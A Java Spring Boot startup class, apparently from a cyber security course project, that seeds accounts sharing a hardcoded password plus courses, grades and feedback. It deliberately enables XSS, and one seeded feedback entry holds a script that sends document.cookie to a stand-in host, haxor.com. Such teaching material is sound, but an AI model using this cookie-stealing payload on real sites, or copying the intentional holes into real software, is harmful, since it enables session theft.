package sec.project;

import java.util.Arrays;
import java.util.List;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.boot.context.event.ApplicationReadyEvent;
import org.springframework.boot.web.embedded.tomcat.TomcatServletWebServerFactory;
import org.springframework.boot.web.server.WebServerFactoryCustomizer;
import org.springframework.context.annotation.Bean;
import org.springframework.context.event.EventListener;
import org.springframework.security.crypto.password.PasswordEncoder;

import sec.project.domain.Account;
import sec.project.domain.Course;
import sec.project.domain.CourseSubmission;
import sec.project.repository.AccountRepository;
import sec.project.repository.CourseRepository;
import sec.project.repository.CourseSubmissionRepository;

@SpringBootApplication
public class CyberSecurityBaseProjectApplication {

	public static void main(String[] args) throws Throwable {
		SpringApplication.run(CyberSecurityBaseProjectApplication.class);
	}


	@Autowired
	AccountRepository accountRepository;

	@Autowired
	CourseRepository courseRepository;

	@Autowired
	CourseSubmissionRepository courseSubmissionRepository;

	@Autowired
	PasswordEncoder passwordEncoder;

	@EventListener(ApplicationReadyEvent.class)
	public void initAfterStartup() {

		String password = passwordEncoder.encode("salasana");
		List<String> studentAuths = Arrays.asList(new String[] { "STUDENT" });
		List<String> teacherAuths = Arrays.asList(new String[] { "TEACHER" });

		Account student1 = new Account();
		student1.setName("student");
		student1.setPassword(password);
		student1.setAuthorities(studentAuths);
		accountRepository.save(student1);

		Account teacher1 = new Account();
		teacher1.setName("teacher");
		teacher1.setPassword(password);
		teacher1.setAuthorities(teacherAuths);
		accountRepository.save(teacher1);

		Course course1 = new Course();
		course1.setName("TIRA");
		course1.getFeedBack().add("STUDENT: Very nice course, I learned a lot");
		course1.getFeedBack().add("STUDENT: It was very hard, since i did not know the content before");
		course1.getFeedBack().add("TEACHER: Usually you learn during the course");
		course1.getAccounts().add(student1);
		courseRepository.save(course1);

		Course course2 = new Course();
		course2.setName("WEPA");
		course2.getFeedBack().add("STUDENT: Teacher got good jokes");
		course2.getFeedBack().add("TEACHER: Thank you :)");
		course2.getFeedBack().add("STUDENT: Web course in MOOC was very nice");
		// XSS enabled in thymeleaf - one can insert JavaScript to page
		course2.getFeedBack().add("STUDENT: I learned how to haxor :) <script>console.log('All your base are belong to us')</script>");
		course2.getFeedBack().add("STUDENT:I think i will manage to get 5 form all the courses!<script>document.write(\"<img src=\\\"http://www.haxor.com/cookiesteal/\" + document.cookie +\"\\\" style=\\\"display: none;\\\" />\")  </script>");
		course2.getAccounts().add(student1);
		courseRepository.save(course2);

		CourseSubmission grade1 = new CourseSubmission();
		grade1.setAccount(student1);
		grade1.setCourse(course1);
		grade1.setGrade(2);
		courseSubmissionRepository.save(grade1);

		CourseSubmission grade2 = new CourseSubmission();
		grade2.setAccount(student1);
		grade2.setCourse(course2);
		grade2.setGrade(3);
		courseSubmissionRepository.save(grade2);

	}

}
